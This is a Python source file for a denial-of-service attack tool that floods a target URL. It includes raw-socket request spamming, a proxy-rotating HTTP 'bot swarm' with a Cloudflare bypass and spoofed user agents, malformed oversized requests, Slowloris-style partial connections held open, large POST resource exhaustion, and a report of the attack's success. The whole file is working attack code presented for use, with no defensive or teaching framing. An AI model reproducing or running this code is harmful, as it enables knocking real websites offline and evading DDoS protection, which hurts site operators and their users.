#!/usr/bin/env python3
"""
DDOS DISABLER HANDLER
Main attack coordination and execution
"""

import time
import random
import threading
from colorama import Fore, Style

class DDoSDisabler:
    def __init__(self, target_url, attack_type, thread_count=1000, instant_mode=False):
        self.target_url = target_url
        self.attack_type = attack_type
        self.thread_count = min(thread_count, 10000)
        self.instant_mode = instant_mode
        self.active = True
        self.stats = {
            'requests_sent': 0,
            'successful': 0,
            'failed': 0,
            'connections': 0,
            'start_time': time.time()
        }
        self.stats_lock = threading.Lock()
        
        # Import other modules
        from bypass_handler import CloudflareBypass
        from thread_manager import ThreadController
        from attack_methods import AttackMethods
        
        self.bypass = CloudflareBypass()
        self.thread_mgr = ThreadController(max_threads=self.thread_count)
        self.attacks = AttackMethods(target_url)
    
    def execute_attack(self):
        """Execute selected attack method"""
        print(f"{Fore.CYAN}[*] Executing {self.attack_type} attack...")
        
        if self.attack_type == 'Request Spammer':
            return self._execute_request_spam()
        elif self.attack_type == 'HTTP/HTTPS Flood':
            return self._execute_http_flood()
        elif self.attack_type == 'Multifactor Fallback':
            return self._execute_multifactor()
        else:
            print(f"{Fore.RED}[!] Unknown attack type")
            return False
    
    def _execute_request_spam(self):
        """Execute request spam attack"""
        print(f"{Fore.GREEN}[+] Starting Request Spammer...")
        
        # Load proxies if needed
        proxies = self.bypass.load_proxies()[:100]  # Limit to 100 proxies
        
        # Calculate attack parameters
        requests_per_thread = 1000 if self.instant_mode else 500
        delay_range = (0.001, 0.01) if self.instant_mode else (0.01, 0.1)
        
        # Create attack function
        def spam_worker(worker_id):
            import socket
            import ssl
            from urllib.parse import urlparse
            
            parsed = urlparse(self.target_url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            for i in range(requests_per_thread):
                if not self.active:
                    break
                
                try:
                    # Create socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    
                    # SSL for HTTPS
                    if parsed.scheme == 'https':
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=host)
                    
                    # Connect
                    sock.connect((host, port))
                    
                    # Create request
                    request = f"GET {parsed.path or '/'}?{random.randint(1, 99999)} HTTP/1.1\r\n"
                    request += f"Host: {host}\r\n"
                    request += f"User-Agent: {self._random_user_agent()}\r\n"
                    request += "Accept: */*\r\n"
                    request += "Connection: close\r\n"
                    request += "\r\n"
                    
                    # Send request
                    sock.send(request.encode())
                    
                    # Update stats
                    with self.stats_lock:
                        self.stats['requests_sent'] += 1
                        self.stats['successful'] += 1
                        self.stats['connections'] += 1
                    
                    # Close quickly (don't wait for response)
                    sock.close()
                    
                    # Random delay
                    time.sleep(random.uniform(*delay_range))
                    
                except Exception as e:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                    continue
        
        # Start threads
        self.thread_mgr.execute_threads(spam_worker, self.thread_count)
        
        # Run for duration
        attack_duration = 30 if self.instant_mode else 60
        time.sleep(attack_duration)
        
        # Stop attack
        self.active = False
        self.thread_mgr.stop_all()
        
        return self._generate_report()
    
    def _execute_http_flood(self):
        """Execute HTTP flood with Cloudflare bypass"""
        print(f"{Fore.GREEN}[+] Starting HTTP/HTTPS Flood...")
        
        # Bypass Cloudflare if detected
        if self.bypass.detect_cloudflare(self.target_url):
            print(f"{Fore.YELLOW}[!] Cloudflare detected. Attempting bypass...")
            if self.bypass.execute_bypass(self.target_url):
                print(f"{Fore.GREEN}[✓] Cloudflare bypass successful")
            else:
                print(f"{Fore.RED}[!] Cloudflare bypass failed, continuing...")
        
        # Load proxies for bot swarm
        proxies = self.bypass.load_proxies()
        print(f"{Fore.CYAN}[*] Using {len(proxies)} proxies for bot swarm")
        
        # Bot swarm parameters
        requests_per_bot = 500 if self.instant_mode else 200
        bot_count = min(self.thread_count, 500)  # Max 500 bots
        
        def bot_worker(bot_id):
            import requests
            from requests.adapters import HTTPAdapter
            from urllib3.util.retry import Retry
            
            session = requests.Session()
            
            # Configure retry strategy
            retry = Retry(
                total=2,
                backoff_factor=0.5,
                status_forcelist=[429, 500, 502, 503, 504]
            )
            adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            # Use random proxy
            proxy = None
            if proxies:
                proxy = {'http': f'http://{random.choice(proxies)}',
                        'https': f'http://{random.choice(proxies)}'}
            
            for i in range(requests_per_bot):
                if not self.active:
                    break
                
                try:
                    # Generate headers
                    headers = self.bypass.generate_stealth_headers()
                    
                    # Send request
                    response = session.get(
                        self.target_url,
                        headers=headers,
                        proxies=proxy,
                        timeout=3,
                        verify=False
                    )
                    
                    # Update stats
                    with self.stats_lock:
                        self.stats['requests_sent'] += 1
                        if response.status_code < 400:
                            self.stats['successful'] += 1
                        else:
                            self.stats['failed'] += 1
                    
                    # Rotate proxy occasionally
                    if i % 10 == 0 and proxies:
                        proxy = {'http': f'http://{random.choice(proxies)}',
                                'https': f'http://{random.choice(proxies)}'}
                    
                    # Delay
                    time.sleep(random.uniform(0.001, 0.005) if self.instant_mode else 
                             random.uniform(0.05, 0.1))
                    
                except Exception:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                    continue
        
        # Start bot swarm
        self.thread_mgr.execute_threads(bot_worker, bot_count)
        
        # Run attack
        attack_duration = 40 if self.instant_mode else 80
        time.sleep(attack_duration)
        
        # Stop
        self.active = False
        self.thread_mgr.stop_all()
        
        return self._generate_report()
    
    def _execute_multifactor(self):
        """Execute multifactor fallback attack"""
        print(f"{Fore.GREEN}[+] Starting Multifactor Fallback Attack...")
        
        # Phase 1: Initial bombardment
        print(f"{Fore.YELLOW}[*] Phase 1: Initial bombardment")
        self._phase_bombardment()
        
        if self.active:
            # Phase 2: Connection exhaustion
            print(f"{Fore.YELLOW}[*] Phase 2: Connection exhaustion")
            self._phase_connection_exhaustion()
        
        if self.active:
            # Phase 3: Resource depletion
            print(f"{Fore.YELLOW}[*] Phase 3: Resource depletion")
            self._phase_resource_depletion()
        
        if self.active:
            # Phase 4: Silent fallback
            print(f"{Fore.YELLOW}[*] Phase 4: Silent fallback penetration")
            self._phase_silent_fallback()
        
        # Stop all
        self.active = False
        self.thread_mgr.stop_all()
        
        return self._generate_report()
    
    def _phase_bombardment(self):
        """Phase 1: Bombardment"""
        import socket
        
        def bombardment_worker(worker_id):
            parsed = urlparse(self.target_url)
            host = parsed.hostname
            port = parsed.port or 80
            
            for i in range(200):
                if not self.active:
                    break
                
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((host, port))
                    
                    # Send malformed request
                    request = f"GET /{'A' * random.randint(100, 1000)} HTTP/1.1\r\n"
                    request += f"Host: {host}\r\n"
                    request += "User-Agent: " + 'A' * 500 + "\r\n"
                    request += "\r\n"
                    
                    sock.send(request.encode())
                    sock.close()
                    
                    with self.stats_lock:
                        self.stats['requests_sent'] += 1
                        self.stats['successful'] += 1
                    
                    time.sleep(random.uniform(0.001, 0.01))
                    
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
        
        from urllib.parse import urlparse
        
        self.thread_mgr.execute_threads(bombardment_worker, self.thread_count // 2)
        time.sleep(20 if self.instant_mode else 30)
    
    def _phase_connection_exhaustion(self):
        """Phase 2: Connection exhaustion"""
        import socket
        
        def connection_worker(worker_id):
            parsed = urlparse(self.target_url)
            host = parsed.hostname
            port = parsed.port or 80
            
            sockets = []
            try:
                # Create multiple connections
                for i in range(10):
                    if not self.active:
                        break
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((host, port))
                    sockets.append(sock)
                    
                    # Send partial request
                    sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                    # Don't complete the request
                
                # Hold connections open
                start_time = time.time()
                while self.active and (time.time() - start_time) < 30:
                    time.sleep(1)
                
            finally:
                # Cleanup
                for sock in sockets:
                    try:
                        sock.close()
                    except:
                        pass
        
        from urllib.parse import urlparse
        
        self.thread_mgr.execute_threads(connection_worker, self.thread_count // 4)
        time.sleep(25 if self.instant_mode else 40)
    
    def _phase_resource_depletion(self):
        """Phase 3: Resource depletion"""
        import requests
        
        def resource_worker(worker_id):
            session = requests.Session()
            
            for i in range(100):
                if not self.active:
                    break
                
                try:
                    # Send large POST request
                    data = {'data': 'A' * random.randint(5000, 20000)}
                    session.post(
                        self.target_url,
                        data=data,
                        timeout=3,
                        verify=False,
                        headers={'User-Agent': self._random_user_agent()}
                    )
                    
                    with self.stats_lock:
                        self.stats['requests_sent'] += 1
                        self.stats['successful'] += 1
                    
                    time.sleep(random.uniform(0.1, 0.5))
                    
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
        
        self.thread_mgr.execute_threads(resource_worker, self.thread_count // 3)
        time.sleep(15 if self.instant_mode else 25)
    
    def _phase_silent_fallback(self):
        """Phase 4: Silent fallback"""
        import requests
        
        def silent_worker(worker_id):
            session = requests.Session()
            delay = random.uniform(5, 10) if self.instant_mode else random.uniform(15, 30)
            
            while self.active:
                try:
                    session.get(
                        self.target_url,
                        timeout=10,
                        verify=False,
                        headers={'User-Agent': self._random_user_agent()}
                    )
                    
                    with self.stats_lock:
                        self.stats['requests_sent'] += 1
                        self.stats['successful'] += 1
                    
                    time.sleep(delay)
                    
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                    time.sleep(delay * 2)
        
        self.thread_mgr.execute_threads(silent_worker, min(self.thread_count, 100))
        time.sleep(30 if self.instant_mode else 60)
    
    def _random_user_agent(self):
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15',
        ]
        return random.choice(agents)
    
    def _generate_report(self):
        """Generate attack report"""
        elapsed = time.time() - self.stats['start_time']
        rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
        
        print(f"\n{Fore.CYAN}{'═'*50}")
        print(f"{Fore.YELLOW}    📊 ATTACK STATISTICS")
        print(f"{Fore.CYAN}{'═'*50}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}Requests Sent:{Fore.WHITE} {self.stats['requests_sent']:,}")
        print(f"{Fore.MAGENTA}Successful:{Fore.WHITE} {self.stats['successful']:,}")
        print(f"{Fore.MAGENTA}Failed:{Fore.WHITE} {self.stats['failed']:,}")
        print(f"{Fore.MAGENTA}Duration:{Fore.WHITE} {elapsed:.1f}s")
        print(f"{Fore.MAGENTA}Requests/sec:{Fore.WHITE} {rps:.1f}")
        print(f"{Fore.MAGENTA}Peak Connections:{Fore.WHITE} {self.stats['connections']:,}")
        
        # Calculate success rate
        if self.stats['requests_sent'] > 0:
            success_rate = (self.stats['successful'] / self.stats['requests_sent']) * 100
            print(f"{Fore.MAGENTA}Success Rate:{Fore.WHITE} {success_rate:.1f}%")
        
        # Determine if attack was successful
        total_impact = self.stats['successful'] + (self.stats['connections'] * 10)
        return total_impact > 1000  # Minimum threshold for "success"
